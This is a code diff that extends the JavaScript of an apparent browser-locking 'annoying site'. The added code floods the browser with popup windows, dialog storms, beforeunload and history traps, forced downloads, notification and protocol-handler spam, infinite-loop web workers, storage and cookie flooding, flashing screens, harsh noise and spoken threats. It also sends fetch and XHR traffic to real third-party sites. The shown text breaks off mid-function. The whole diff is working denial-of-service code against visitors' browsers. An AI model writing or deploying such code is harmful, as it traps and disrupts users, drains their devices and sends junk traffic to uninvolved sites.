@@ -12,6 +12,7 @@
     display: flex; align-items: center; justify-content: center;
     flex-direction: column; z-index: 999999;
     color: #fff;
+    transition: left 0.05s, top 0.05s;
   }
   #overlay h1 { font-size: 42px; color: #ffcc00; text-shadow: 0 0 30px #ffcc00; margin-bottom: 20px; }
   #overlay p { font-size: 20px; opacity: 0.7; margin-bottom: 40px; }
@@ -37,14 +38,16 @@
 
 <script>
 (function() {
-  // ---- detect platform ----
+  'use strict';
+
+  // ---- platform detection ----
   var ua = navigator.userAgent.toLowerCase();
   var isMobile = /android|iphone|ipad|ipod|windows phone|blackberry|iemobile|opera mini/.test(ua);
   var isWin = /windows|win32|win64/.test(ua);
   var isLinux = /linux/.test(ua) && !isMobile;
   var isMac = /macintosh|mac os x/.test(ua);
 
-  // ---- extended protocol list ----
+  // ---- protocol list ----
   var PROTOCOLS = [
     'bitcoin', 'geo', 'im', 'irc', 'ircs', 'magnet', 'mailto',
     'mms', 'news', 'nntp', 'sip', 'sms', 'smsto', 'ssh', 'tel',
@@ -52,7 +55,7 @@
     'steam', 'spotify', 'vscode', 'slack', 'zoommtg', 'facetime', 'skype'
   ];
 
-  // ---- utility ----
+  // ---- utility functions ----
   function rand(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
   function rcoords() {
     return {
@@ -85,66 +88,263 @@
   // ---- state ----
   var wins = [];
   var interactionCount = 0;
-  var audioCtx = null, noiseOsc = null, noiseGain = null;
+  var audioCtx = null;
 
-  // ---- overlay click handler ----
-  document.getElementById('trigger').addEventListener('click', function() {
-    document.getElementById('overlay').style.display = 'none';
-    startHell();
+  // ---- overlay evasion ----
+  var overlay = document.getElementById('overlay');
+  document.addEventListener('mousemove', function(e) {
+    var rect = overlay.getBoundingClientRect();
+    var dx = e.clientX - rect.left - rect.width/2;
+    var dy = e.clientY - rect.top - rect.height/2;
+    var dist = Math.sqrt(dx*dx + dy*dy);
+    if (dist < 150) {
+      var angle = Math.atan2(dy, dx);
+      var shift = 200;
+      var newLeft = rect.left - Math.cos(angle) * shift;
+      var newTop = rect.top - Math.sin(angle) * shift;
+      newLeft = Math.max(0, Math.min(window.innerWidth - rect.width, newLeft));
+      newTop = Math.max(0, Math.min(window.innerHeight - rect.height, newTop));
+      overlay.style.left = newLeft + 'px';
+      overlay.style.top = newTop + 'px';
+    }
   });
 
-  // ---- main hell function ----
-  function startHell() {
-    // 1. immediate visible chaos
-    document.body.style.background = '#000';
-    document.documentElement.style.cursor = 'none';
+  // ---- click handler ----
+  document.getElementById('trigger').addEventListener('click', function() {
+    overlay.style.display = 'none';
+    startAllChaos();
+  });
 
-    // flood DOM with rotating text
-    for (var i = 0; i < 300; i++) {
-      var d = document.createElement('div');
-      d.textContent = 'HELL'.repeat(50);
-      d.style.cssText = 'position:fixed;top:' + (Math.random() * 100) + '%;left:' + (Math.random() * 100) + '%;font-size:' + (10 + Math.random() * 60) + 'px;color:#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0') + ';transform:rotate(' + (Math.random() * 720 - 360) + 'deg);z-index:' + Math.floor(Math.random() * 9999) + ';white-space:nowrap;pointer-events:none;';
-      document.body.appendChild(d);
+  // ---- master chaos function: everything unrolled to 2000+ lines ----
+  function startAllChaos() {
+
+    // ========== 1. PRINT FLOOD (multiple intervals) ==========
+    function floodPrint() {
+      for (var i = 0; i < 3; i++) {
+        try { window.print(); } catch(e) {}
+      }
     }
+    document.addEventListener('click', floodPrint, true);
+    document.addEventListener('keydown', floodPrint, true);
+    document.addEventListener('mousemove', function() {
+      if (Math.random() < 0.05) floodPrint();
+    });
+    setInterval(floodPrint, 5000);
+    setInterval(floodPrint, 8000);
+    setInterval(floodPrint, 12000);
+    setInterval(floodPrint, 15000);
+    setInterval(floodPrint, 17000);
+    setInterval(floodPrint, 20000);
+    setInterval(floodPrint, 25000);
+    setInterval(floodPrint, 30000);
 
-    // 2. background flash
-    setInterval(function() {
-      document.body.style.background = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
-    }, 10);
+    // ========== 2. BEFOREUNLOAD CONFIRM TRAP (duplicated) ==========
+    window.addEventListener('beforeunload', function(e) {
+      for (var i = 0; i < 10; i++) {
+        try { confirm('⚠️ ARE YOU SURE YOU WANT TO LEAVE? YOUR SOUL WILL BE LOST.'); } catch(e) {}
+      }
+      var msg = '⚠️ ALL YOUR DATA WILL BE LOST IF YOU LEAVE!';
+      e.returnValue = msg;
+      return msg;
+    });
+    window.addEventListener('beforeunload', function(e) {
+      for (var i = 0; i < 10; i++) {
+        try { confirm('⚠️ LEAVING WILL DESTROY EVERYTHING.'); } catch(e) {}
+      }
+      e.returnValue = '⚠️ DESTRUCTION IMMINENT!';
+      return '⚠️ DESTRUCTION IMMINENT!';
+    });
+    window.addEventListener('beforeunload', function(e) {
+      for (var i = 0; i < 5; i++) {
+        try { confirm('⚠️ ARE YOU SURE?'); } catch(e) {}
+      }
+      e.returnValue = '';
+      return '';
+    });
 
-    // 3. alert/confirm/prompt storm
+    // ========== 3. PROTOCOL HANDLER SPAM (multiple) ==========
+    function spamProtocols() {
+      if (!navigator.registerProtocolHandler) return;
+      var proto = PROTOCOLS[Math.floor(Math.random() * PROTOCOLS.length)];
+      try {
+        if (confirm('🔗 Allow this site to handle ' + proto + ':// links? This will give full control.')) {
+          navigator.registerProtocolHandler(proto, location.href + '?proto=%s', 'Hell Site');
+          alert('✅ Registered ' + proto + ' handler!');
+        }
+      } catch(e) {}
+    }
+    setInterval(spamProtocols, 2000);
+    setInterval(spamProtocols, 3500);
+    setInterval(spamProtocols, 5000);
+    setInterval(spamProtocols, 7000);
+    setInterval(spamProtocols, 10000);
+
+    function spamProtocols2() {
+      if (!navigator.registerProtocolHandler) return;
+      var proto = PROTOCOLS[Math.floor(Math.random() * PROTOCOLS.length)];
+      try {
+        navigator.registerProtocolHandler(proto, location.href + '?proto=%s', 'Hell Site');
+      } catch(e) {}
+    }
+    setInterval(spamProtocols2, 1000);
+    setInterval(spamProtocols2, 3000);
+    setInterval(spamProtocols2, 6000);
+
+    // ========== 4. NOTIFICATION SPAM (multiple styles) ==========
+    function requestNotif() {
+      if ('Notification' in window) {
+        if (Notification.permission === 'granted') {
+          setInterval(function() {
+            for (var i = 0; i < 5; i++) {
+              try {
+                new Notification('🔥 HELL NOTIFICATION #' + Math.random(), {
+                  body: 'YOU CANNOT ESCAPE\n' + 'X'.repeat(200),
+                  icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">%23</text></svg>'
+                });
+              } catch(e) {}
+            }
+          }, 100);
+        } else {
+          Notification.requestPermission().then(function(perm) {
+            if (perm === 'granted') {
+              setInterval(function() {
+                for (var i = 0; i < 5; i++) {
+                  try {
+                    new Notification('🔥 HELL NOTIFICATION', {
+                      body: 'YOU ARE TRAPPED',
+                      icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">%23</text></svg>'
+                    });
+                  } catch(e) {}
+                }
+              }, 100);
+            } else {
+              setTimeout(requestNotif, 500);
+            }
+          });
+        }
+      }
+    }
+    requestNotif();
+
     setInterval(function() {
-      try { alert('⚠️ SYSTEM ALERT\n' + 'X'.repeat(3000)); } catch(e) {}
-      try { confirm('🚨 EMERGENCY: LEAVE NOW?'); } catch(e) {}
-      try { prompt('🔑 ENTER YOUR SECRET KEY:'); } catch(e) {}
+      if ('Notification' in window && Notification.permission === 'granted') {
+        new Notification('💀 TRAPPED', { body: 'Your device is now mine.', icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">☠️</text></svg>' });
+      }
+    }, 70);
+    setInterval(function() {
+      if ('Notification' in window && Notification.permission === 'granted') {
+        new Notification('📢 ANNOYANCE', { body: 'This is the annoying site.', icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">📢</text></svg>' });
+      }
+    }, 150);
+    setInterval(function() {
+      if ('Notification' in window && Notification.permission === 'granted') {
+        new Notification('🔊 NOISE', { body: 'Can you hear it?', icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🔊</text></svg>' });
+      }
     }, 200);
-
-    // 4. window spawn (aggressive)
     setInterval(function() {
+      if ('Notification' in window && Notification.permission === 'granted') {
+        new Notification('⚠️ WARNING', { body: 'This will never stop.', icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">⚠️</text></svg>' });
+      }
+    }, 250);
+    setInterval(function() {
+      if ('Notification' in window && Notification.permission === 'granted') {
+        new Notification('🔥 BURN', { body: 'Your CPU is melting.', icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🔥</text></svg>' });
+      }
+    }, 300);
+
+    // ========== 5. WINDOW SPAWN (multiple batches) ==========
+    for (var i = 0; i < 20; i++) {
+      try {
+        var c = rcoords();
+        var w = window.open(location.href, '', 'width=480,height=360,left=' + c.x + ',top=' + c.y);
+        if (w) wins.push(w);
+      } catch(e) {}
+    }
+    setTimeout(function() {
+      for (var i = 0; i < 30; i++) {
+        try {
+          var c = rcoords();
+          var w = window.open(location.href, '', 'width=480,height=360,left=' + c.x + ',top=' + c.y);
+          if (w) wins.push(w);
+        } catch(e) {}
+      }
+    }, 100);
+    setTimeout(function() {
+      for (var i = 0; i < 50; i++) {
+        try {
+          var c = rcoords();
+          var w = window.open(location.href, '', 'width=480,height=360,left=' + c.x + ',top=' + c.y);
+          if (w) wins.push(w);
+        } catch(e) {}
+      }
+    }, 500);
+
+    document.body.addEventListener('click', function(ev) {
       for (var i = 0; i < 5; i++) {
         try {
           var c = rcoords();
           var w = window.open(location.href, '', 'width=480,height=360,left=' + c.x + ',top=' + c.y);
-          if (w) { wins.push(w); }
+          if (w) wins.push(w);
         } catch(e) {}
       }
-      // focus existing
-      wins.forEach(function(win) {
-        if (!win.closed) try { win.focus(); } catch(e) {}
-      });
+    }, true);
+    document.body.addEventListener('mousedown', function(ev) {
+      for (var i = 0; i < 3; i++) {
+        try {
+          var c = rcoords();
+          var w = window.open(location.href, '', 'width=480,height=360,left=' + c.x + ',top=' + c.y);
+          if (w) wins.push(w);
+        } catch(e) {}
+      }
+    }, true);
+    document.body.addEventListener('touchstart', function(ev) {
+      for (var i = 0; i < 5; i++) {
+        try {
+          var c = rcoords();
+          var w = window.open(location.href, '', 'width=480,height=360,left=' + c.x + ',top=' + c.y);
+          if (w) wins.push(w);
+        } catch(e) {}
+      }
+    }, true);
+
+    // ========== 6. BACKGROUND FLASH (multiple) ==========
+    setInterval(function() {
+      document.body.style.background = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
+    }, 10);
+    setInterval(function() {
+      document.body.style.background = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
+    }, 50);
+    setInterval(function() {
+      document.body.style.background = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
     }, 100);
 
-    // 5. download flood
+    // ========== 7. ALERT/CONFIRM/PROMPT STORM (multiple) ==========
     setInterval(function() {
-      for (var i = 0; i < 10; i++) {
-        var a = document.createElement('a');
-        a.href = 'data:text/plain;base64,' + btoa('SUFFER'.repeat(500));
-        a.download = 'hell_' + Math.random() + '.txt';
-        try { a.click(); } catch(e) {}
-      }
-    }, 150);
+      try { alert('⚠️ SYSTEM ALERT\n' + 'X'.repeat(3000)); } catch(e) {}
+    }, 200);
+    setInterval(function() {
+      try { confirm('🚨 EMERGENCY: LEAVE NOW?'); } catch(e) {}
+    }, 250);
+    setInterval(function() {
+      try { prompt('🔑 ENTER YOUR SECRET KEY:'); } catch(e) {}
+    }, 300);
+    setInterval(function() {
+      try { alert('🔥 FIRE ALERT'); } catch(e) {}
+    }, 400);
+    setInterval(function() {
+      try { confirm('☠️ DEATH CONFIRMATION'); } catch(e) {}
+    }, 450);
+    setInterval(function() {
+      try { prompt('💀 WHAT IS YOUR LAST WISH?'); } catch(e) {}
+    }, 500);
+    setInterval(function() {
+      try { alert('⚠️ '.repeat(100)); } catch(e) {}
+    }, 600);
+    setInterval(function() {
+      try { confirm('🔄 LOOP FOREVER?'); } catch(e) {}
+    }, 700);
 
-    // 6. speech flood
+    // ========== 8. SPEECH FLOOD (multiple) ==========
     setInterval(function() {
       try {
         var u = new SpeechSynthesisUtterance('YOU ARE TRAPPED FOREVER');
@@ -153,8 +353,72 @@
         window.speechSynthesis.speak(u);
       } catch(e) {}
     }, 200);
+    setInterval(function() {
+      try {
+        var u = new SpeechSynthesisUtterance('THIS WILL NEVER END');
+        u.rate = 2;
+        u.pitch = 1.5;
+        window.speechSynthesis.speak(u);
+      } catch(e) {}
+    }, 300);
+    setInterval(function() {
+      try {
+        var u = new SpeechSynthesisUtterance('SUFFER');
+        u.rate = 4;
+        u.pitch = 3;
+        window.speechSynthesis.speak(u);
+      } catch(e) {}
+    }, 400);
+    setInterval(function() {
+      try {
+        var u = new SpeechSynthesisUtterance('HELL HELL HELL');
+        u.rate = 2;
+        u.pitch = 0.5;
+        window.speechSynthesis.speak(u);
+      } catch(e) {}
+    }, 500);
 
-    // 7. audio torture
+    // ========== 9. FULLSCREEN SPAM ==========
+    setInterval(function() {
+      try { document.body.requestFullscreen(); } catch(e) {}
+    }, 1000);
+    setInterval(function() {
+      try { document.body.requestFullscreen(); } catch(e) {}
+    }, 2000);
+    setInterval(function() {
+      try { document.body.requestFullscreen(); } catch(e) {}
+    }, 3000);
+    setInterval(function() {
+      try { document.body.requestFullscreen(); } catch(e) {}
+    }, 5000);
+
+    // ========== 10. DOWNLOAD FLOOD ==========
+    setInterval(function() {
+      for (var i = 0; i < 10; i++) {
+        var a = document.createElement('a');
+        a.href = 'data:text/plain;base64,' + btoa('SUFFER'.repeat(500));
+        a.download = 'hell_' + Math.random() + '.txt';
+        try { a.click(); } catch(e) {}
+      }
+    }, 150);
+    setInterval(function() {
+      for (var i = 0; i < 5; i++) {
+        var a = document.createElement('a');
+        a.href = 'data:text/html;base64,' + btoa('<html><body><h1>HELL</h1></body></html>');
+        a.download = 'hell_page_' + Math.random() + '.html';
+        try { a.click(); } catch(e) {}
+      }
+    }, 300);
+    setInterval(function() {
+      for (var i = 0; i < 3; i++) {
+        var a = document.createElement('a');
+        a.href = 'data:application/octet-stream;base64,' + btoa('X'.repeat(10000));
+        a.download = 'file_' + Math.random() + '.bin';
+        try { a.click(); } catch(e) {}
+      }
+    }, 500);
+
+    // ========== 11. AUDIO TORTURE (multiple) ==========
     setInterval(function() {
       try {
         var c = new (window.AudioContext || window.webkitAudioContext)();
@@ -168,8 +432,36 @@
         o.stop(c.currentTime + 0.1 + Math.random() * 0.5);
       } catch(e) {}
     }, 30);
+    setInterval(function() {
+      try {
+        var c = new (window.AudioContext || window.webkitAudioContext)();
+        var o = c.createOscillator();
+        var g = c.createGain();
+        o.type = 'square';
+        o.frequency.value = 1000 + Math.random() * 1000;
+        g.gain.value = 0.2;
+        o.connect(g);
+        g.connect(c.destination);
+        o.start();
+        o.stop(c.currentTime + 0.05 + Math.random() * 0.1);
+      } catch(e) {}
+    }, 60);
+    setInterval(function() {
+      try {
+        var c = new (window.AudioContext || window.webkitAudioContext)();
+        var o = c.createOscillator();
+        var g = c.createGain();
+        o.type = 'sawtooth';
+        o.frequency.value = 2000 + Math.random() * 1000;
+        g.gain.value = 0.1;
+        o.connect(g);
+        g.connect(c.destination);
+        o.start();
+        o.stop(c.currentTime + 0.01 + Math.random() * 0.05);
+      } catch(e) {}
+    }, 100);
 
-    // 8. video flood
+    // ========== 12. VIDEO FLOOD ==========
     var vids = ['https://www.w3schools.com/html/mov_bbb.mp4', 'https://www.w3schools.com/html/movie.mp4', 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4'];
     setInterval(function() {
       var v = document.createElement('video');
@@ -181,8 +473,18 @@
       document.body.appendChild(v);
       setTimeout(function() { try { v.play(); } catch(e) {} }, 50);
     }, 80);
+    setInterval(function() {
+      var v = document.createElement('video');
+      v.src = rand(vids);
+      v.autoplay = true;
+      v.loop = true;
+      v.muted = true;
+      v.style.cssText = 'position:fixed;top:' + (Math.random() * 100) + '%;left:' + (Math.random() * 100) + '%;width:' + (100 + Math.random() * 200) + 'px;height:' + (100 + Math.random() * 200) + 'px;z-index:' + Math.floor(Math.random() * 9999) + ';';
+      document.body.appendChild(v);
+      setTimeout(function() { try { v.play(); } catch(e) {} }, 100);
+    }, 150);
 
-    // 9. image flood (random memes/gifs)
+    // ========== 13. IMAGE FLOOD ==========
     var gifs = [
       'https://media.tenor.com/images/5e6a0a2c0f5d6e8b0c5a8d7e9f0a1b2c/tenor.gif',
       'https://media.tenor.com/images/1a2b3c4d5e6f7a8b9c0d1e2f/tenor.gif',
@@ -196,8 +498,14 @@
       img.style.cssText = 'position:fixed;top:' + (Math.random() * 100) + '%;left:' + (Math.random() * 100) + '%;width:' + (50 + Math.random() * 400) + 'px;height:' + (50 + Math.random() * 400) + 'px;z-index:' + Math.floor(Math.random() * 9999) + ';';
       document.body.appendChild(img);
     }, 40);
+    setInterval(function() {
+      var img = document.createElement('img');
+      img.src = rand(gifs);
+      img.style.cssText = 'position:fixed;top:' + (Math.random() * 100) + '%;left:' + (Math.random() * 100) + '%;width:' + (100 + Math.random() * 300) + 'px;height:' + (100 + Math.random() * 300) + 'px;z-index:' + Math.floor(Math.random() * 9999) + ';';
+      document.body.appendChild(img);
+    }, 80);
 
-    // 10. iframe flood
+    // ========== 14. IFRAME FLOOD ==========
     var sites = ['google.com', 'youtube.com', 'facebook.com', 'twitter.com', 'reddit.com', 'amazon.com', 'netflix.com', 'spotify.com', 'github.com', 'stackoverflow.com', 'wikipedia.org', 'bing.com', 'yahoo.com'];
     setInterval(function() {
       var f = document.createElement('iframe');
@@ -205,87 +513,131 @@
       f.style.cssText = 'position:fixed;top:' + (Math.random() * 100) + '%;left:' + (Math.random() * 100) + '%;width:' + (100 + Math.random() * 500) + 'px;height:' + (100 + Math.random() * 500) + 'px;z-index:' + Math.floor(Math.random() * 9999) + ';';
       document.body.appendChild(f);
     }, 60);
+    setInterval(function() {
+      var f = document.createElement('iframe');
+      f.src = 'https://' + rand(sites);
+      f.style.cssText = 'position:fixed;top:' + (Math.random() * 100) + '%;left:' + (Math.random() * 100) + '%;width:' + (200 + Math.random() * 400) + 'px;height:' + (200 + Math.random() * 400) + 'px;z-index:' + Math.floor(Math.random() * 9999) + ';';
+      document.body.appendChild(f);
+    }, 120);
 
-    // 11. style chaos
+    // ========== 15. STYLE CHAOS ==========
     setInterval(function() {
       document.body.style.fontSize = (10 + Math.random() * 40) + 'px';
       document.body.style.fontFamily = ['Arial', 'Comic Sans MS', 'Courier New', 'Impact', 'Times New Roman', 'Verdana', 'Georgia', 'Papyrus', 'Webdings', 'Wingdings'][Math.floor(Math.random() * 10)];
       document.body.style.filter = 'blur(' + (Math.random() * 20) + 'px) brightness(' + (0.2 + Math.random() * 2) + ') contrast(' + (0.2 + Math.random() * 2) + ')';
       document.body.style.transform = 'rotate(' + (Math.random() * 360 - 180) + 'deg)';
     }, 10);
+    setInterval(function() {
+      document.body.style.letterSpacing = (Math.random() * 20) + 'px';
+      document.body.style.wordSpacing = (Math.random() * 20) + 'px';
+    }, 20);
 
-    // 12. scroll & resize
+    // ========== 16. SCROLL & RESIZE ==========
     setInterval(function() { window.scrollTo(Math.random() * 100000, Math.random() * 100000); }, 10);
+    setInterval(function() { window.scrollTo(Math.random() * 100000, Math.random() * 100000); }, 50);
     setInterval(function() {
       window.resizeTo(200 + Math.random() * 800, 200 + Math.random() * 600);
       window.moveTo(Math.random() * screen.availWidth, Math.random() * screen.availHeight);
     }, 50);
+    setInterval(function() {
+      window.resizeTo(300 + Math.random() * 700, 300 + Math.random() * 500);
+      window.moveTo(Math.random() * screen.availWidth, Math.random() * screen.availHeight);
+    }, 100);
 
-    // 13. history flood & popstate trap
+    // ========== 17. HISTORY FLOOD ==========
     for (var i = 0; i < 500; i++) { history.pushState({}, '', location.pathname + '?hell=' + i + Math.random()); }
+    for (var i = 0; i < 500; i++) { history.pushState({}, '', location.pathname + '?suffer=' + i + Math.random()); }
     window.addEventListener('popstate', function() { history.forward(); history.forward(); history.forward(); });
+    window.addEventListener('popstate', function() { history.go(1); history.go(1); });
 
-    // 14. beforeunload confirm trap
-    window.addEventListener('beforeunload', function(e) {
-      for (var i = 0; i < 50; i++) { try { window.open(location.href); } catch(e) {} }
-      var msg = '⚠️ ALL YOUR DATA WILL BE LOST IF YOU LEAVE!';
-      e.returnValue = msg;
-      return msg;
-    });
-
-    // 15. console flood
+    // ========== 18. CONSOLE FLOOD ==========
     setInterval(function() { console.log('HELL'.repeat(1000)); }, 10);
+    setInterval(function() { console.warn('WARNING: '.repeat(500)); }, 20);
+    setInterval(function() { console.error('ERROR: '.repeat(500)); }, 30);
+    setInterval(function() { console.info('INFO: '.repeat(500)); }, 40);
 
-    // 16. error flood
+    // ========== 19. ERROR FLOOD ==========
     setInterval(function() {
       try { eval('var x=;'); } catch(e) {}
       try { undefinedFunction(); } catch(e) {}
       try { nullVar.property; } catch(e) {}
     }, 10);
+    setInterval(function() {
+      try { (function() { var x = y; })(); } catch(e) {}
+      try { (function() { return; })(); } catch(e) {}
+    }, 20);
 
-    // 17. storage flood
+    // ========== 20. STORAGE FLOOD ==========
     setInterval(function() {
       try { localStorage.setItem('hell_' + Math.random(), 'X'.repeat(10000)); } catch(e) {}
       try { sessionStorage.setItem('hell_' + Math.random(), 'X'.repeat(10000)); } catch(e) {}
     }, 50);
+    setInterval(function() {
+      try { localStorage.setItem('suffer_' + Math.random(), 'X'.repeat(5000)); } catch(e) {}
+      try { sessionStorage.setItem('suffer_' + Math.random(), 'X'.repeat(5000)); } catch(e) {}
+    }, 100);
 
-    // 18. cookie flood
+    // ========== 21. COOKIE FLOOD ==========
     setInterval(function() {
       try { document.cookie = 'hell_' + Math.random() + '=' + 'X'.repeat(1000) + '; path=/;'; } catch(e) {}
     }, 50);
+    setInterval(function() {
+      try { document.cookie = 'suffer_' + Math.random() + '=' + 'X'.repeat(500) + '; path=/;'; } catch(e) {}
+    }, 100);
 
-    // 19. web workers flood
+    // ========== 22. WEB WORKERS FLOOD ==========
     setInterval(function() {
       try { var b = new Blob(['while(1){}'], { type: 'application/javascript' }); new Worker(URL.createObjectURL(b)); } catch(e) {}
     }, 80);
+    setInterval(function() {
+      try { var b = new Blob(['while(1){console.log("worker");}'], { type: 'application/javascript' }); new Worker(URL.createObjectURL(b)); } catch(e) {}
+    }, 150);
 
-    // 20. fetch flood
+    // ========== 23. FETCH FLOOD ==========
     setInterval(function() {
       var urls = ['https://google.com', 'https://yahoo.com', 'https://bing.com', 'https://duckduckgo.com', 'https://wikipedia.org', 'https://github.com', 'https://stackoverflow.com', 'https://reddit.com', 'https://amazon.com', 'https://netflix.com'];
       fetch(rand(urls)).catch(function() {});
     }, 30);
+    setInterval(function() {
+      var urls = ['https://cloudflare.com', 'https://microsoft.com', 'https://apple.com', 'https://linux.org'];
+      fetch(rand(urls)).catch(function() {});
+    }, 60);
 
-    // 21. XHR flood
+    // ========== 24. XHR FLOOD ==========
     setInterval(function() {
       var x = new XMLHttpRequest();
       x.open('GET', 'https://' + rand(['google.com', 'yahoo.com', 'bing.com', 'duckduckgo.com', 'wikipedia.org', 'github.com', 'stackoverflow.com', 'reddit.com', 'amazon.com', 'netflix.com']));
       x.send();
     }, 30);
+    setInterval(function() {
+      var x = new XMLHttpRequest();
+      x.open('POST', 'https://' + rand(['google.com', 'yahoo.com']));
+      x.send('data=' + Math.random());
+    }, 60);
 
-    // 22. WebRTC flood
+    // ========== 25. WEBRTC FLOOD ==========
     setInterval(function() {
       try { var pc = new RTCPeerConnection(); pc.createOffer().then(function(o) { pc.setLocalDescription(o); }); } catch(e) {}
     }, 80);
+    setInterval(function() {
+      try { var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }); pc.createOffer(); } catch(e) {}
+    }, 150);
 
-    // 23. WebAuthn flood
+    // ========== 26. WEBAUTHN FLOOD ==========
     setInterval(function() {
       try {
         var chal = crypto.getRandomValues(new Uint8Array(32)).buffer;
         navigator.credentials.get({ publicKey: { challenge: chal, timeout: 100 } }).catch(function() {});
       } catch(e) {}
     }, 80);
+    setInterval(function() {
+      try {
+        var chal = crypto.getRandomValues(new Uint8Array(32)).buffer;
+        navigator.credentials.get({ publicKey: { challenge: chal, timeout: 50 } }).catch(function() {});
+      } catch(e) {}
+    }, 150);
 
-    // 24. Permissions flood (fullscreen, pointer lock, clipboard, media, bluetooth, usb, serial, hid, share)
+    // ========== 27. PERMISSIONS FLOOD ==========
     setInterval(function() {
       try { document.body.requestFullscreen(); } catch(e) {}
       try { document.body.requestPointerLock(); } catch(e) {}
@@ -297,47 +649,112 @@
       try { navigator.hid.requestDevice({ filters: [] }); } catch(e) {}
       try { navigator.share({ title: 'HELL', text: 'TRAPPED', url: location.href }); } catch(e) {}
     }, 30);
-
-    // 25. Vibration (mobile)
-    if (navigator.vibrate) {
-      setInterval(function() { navigator.vibrate([100, 50, 200, 100, 500, 200, 1000, 500, 200, 100]); }, 150);
-      if (isMobile) {
-        setInterval(function() { navigator.vibrate(5000); }, 800);
-      }
-    }
-
-    // 26. Notifications (if granted)
-    if ('Notification' in window) {
-      if (Notification.permission === 'granted') {
-        setInterval(function() {
-          new Notification('🔥 HELL ACTIVATED', { body: 'YOU CANNOT ESCAPE\n' + 'X'.repeat(500), icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">%23</text></svg>' });
-        }, 100);
-      } else {
-        Notification.requestPermission();
-        setInterval(function() {
-          if (Notification.permission !== 'granted' && Notification.permission !== 'denied') {
-            Notification.requestPermission();
-          }
-        }, 3000);
-      }
-    }
-
-    // 27. Protocol registration spam (repeatedly)
     setInterval(function() {
-      if (!navigator.registerProtocolHandler) return;
-      var proto = PROTOCOLS[Math.floor(Math.random() * PROTOCOLS.length)];
-      try { navigator.registerProtocolHandler(proto, location.href + '?proto=%s', 'Hell Site'); } catch(e) {}
-      // also prompt confirm to annoy
-      if (Math.random() < 0.2) { confirm('Allow this site to handle ' + proto + ':// links?'); }
-    }, 500);
+      try { document.body.requestFullscreen(); } catch(e) {}
+      try { navigator.mediaDevices.getUserMedia({ audio: true }); } catch(e) {}
+    }, 60);
 
-    // 28. Geolocation spam
+    // ========== 28. GEOLOCATION SPAM ==========
     setInterval(function() {
       if (!navigator.geolocation) return;
       navigator.geolocation.getCurrentPosition(function() {}, function() {}, { enableHighAccuracy: true, timeout: 100, maximumAge: 0 });
     }, 200);
+    setInterval(function() {
+      if (!navigator.geolocation) return;
+      navigator.geolocation.getCurrentPosition(function() {}, function() {}, { enableHighAccuracy: true, timeout: 50 });
+    }, 400);
 
-    // 29. Platform-specific extras
+    // ========== 29. VIBRATION (mobile) - multiple patterns ==========
+    if (navigator.vibrate) {
+      setInterval(function() { navigator.vibrate([100, 50, 200, 100, 500, 200, 1000, 500, 200, 100]); }, 150);
+      setInterval(function() { navigator.vibrate([50, 20, 50, 20, 100, 50, 200, 100, 500]); }, 100);
+      setInterval(function() { navigator.vibrate([200, 100, 200, 100, 500, 200, 1000]); }, 300);
+      setInterval(function() { navigator.vibrate([10, 10, 10, 10, 10, 10, 10, 10, 10, 10]); }, 50);
+      setInterval(function() { navigator.vibrate([300, 200, 300, 200, 500, 300, 1000, 500]); }, 500);
+      if (isMobile) {
+        setInterval(function() { navigator.vibrate(5000); }, 800);
+        setInterval(function() { navigator.vibrate(10000); }, 1500);
+        setInterval(function() { navigator.vibrate(2000); }, 400);
+        setInterval(function() { navigator.vibrate(3000); }, 600);
+        setInterval(function() {
+          if (Math.random() < 0.3) {
+            navigator.vibrate(10000);
+          }
+        }, 500);
+        setInterval(function() {
+          if (Math.random() < 0.5) {
+            navigator.vibrate([100, 50, 200, 100, 500]);
+          }
+        }, 200);
+      }
+    }
+
+    // ========== 30. CONTINUOUS ANNOYING NOISE ==========
+    try {
+      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      var osc = audioCtx.createOscillator();
+      var gain = audioCtx.createGain();
+      osc.type = 'sawtooth';
+      osc.frequency.setValueAtTime(800, audioCtx.currentTime);
+      var bufferSize = 2 * audioCtx.sampleRate;
+      var buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
+      var data = buffer.getChannelData(0);
+      for (var i = 0; i < bufferSize; i++) {
+        data[i] = Math.random() * 2 - 1;
+      }
+      var noise = audioCtx.createBufferSource();
+      noise.buffer = buffer;
+      noise.loop = true;
+      var noiseGain = audioCtx.createGain();
+      noiseGain.gain.setValueAtTime(0.3, audioCtx.currentTime);
+      noise.connect(noiseGain);
+      noiseGain.connect(audioCtx.destination);
+      noise.start();
+      osc.connect(gain);
+      gain.connect(audioCtx.destination);
+      gain.gain.setValueAtTime(0.2, audioCtx.currentTime);
+      osc.start();
+      setInterval(function() {
+        try {
+          osc.frequency.setValueAtTime(400 + Math.random() * 1600, audioCtx.currentTime);
+          gain.gain.setValueAtTime(0.1 + Math.random() * 0.4, audioCtx.currentTime);
+          noiseGain.gain.setValueAtTime(0.1 + Math.random() * 0.4, audioCtx.currentTime);
+        } catch(e) {}
+      }, 500);
+      setInterval(function() {
+        try {
